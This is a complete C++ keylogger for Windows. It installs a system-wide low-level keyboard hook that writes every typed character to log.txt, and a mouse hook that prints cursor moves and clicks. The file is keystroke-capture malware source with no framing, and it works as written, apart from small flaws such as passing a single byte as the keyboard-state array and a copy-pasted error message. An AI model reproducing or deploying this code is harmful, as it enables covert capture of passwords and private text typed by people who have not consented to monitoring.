#include <bits/stdc++.h>
#include <windows.h>
#include <winuser.h>
using namespace std;
HHOOK kh;
ofstream fil;
#define FILE_PATH "log.txt"
LRESULT CALLBACK KeyboardHookCallback(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        char charBuffer[256];
        BYTE ky =  GetKeyState(VK_SHIFT) & 0x8000;
        int result = ToAscii(vkCode, kbStruct->scanCode, &ky , (WORD*)charBuffer, 0);
        if (result == 1)
        {
            char key = charBuffer[0];

            fil << key;
            fil.flush();
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}
LRESULT CALLBACK MauseCallback(int code, WPARAM wParam, LPARAM lParam)
{
    POINT pos;
    GetCursorPos(&pos);
    cout <<((wParam == 512) ? "MOUSE MOVED: " : "click at: " )<<"  "<< pos.x << " " << pos.y  << " " << endl;
    
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    fil.open(FILE_PATH, ofstream::out | ofstream::app);
    kh = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, NULL, 0);
    if (kh == NULL)
    {
        cerr << "Error al instalar el hook del teclado" << endl;
        fil.close();
        return 1;
    }
    HHOOK mausehok = SetWindowsHookEx(WH_MOUSE_LL, MauseCallback, NULL, 0);
    if (mausehok == NULL)
    {
        cerr << "Error al instalar el hook del teclado" << endl;
        return 1;
    }

    // Iniciar el bucle de mensajes
    MSG message;
    while (GetMessage(&message, NULL, 0, 0) > 0)
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    // Desinstalar el hook del teclado y cerrar el archivo
    UnhookWindowsHookEx(mausehok);
    UnhookWindowsHookEx(kh);
    fil.close();

    return 0;
}
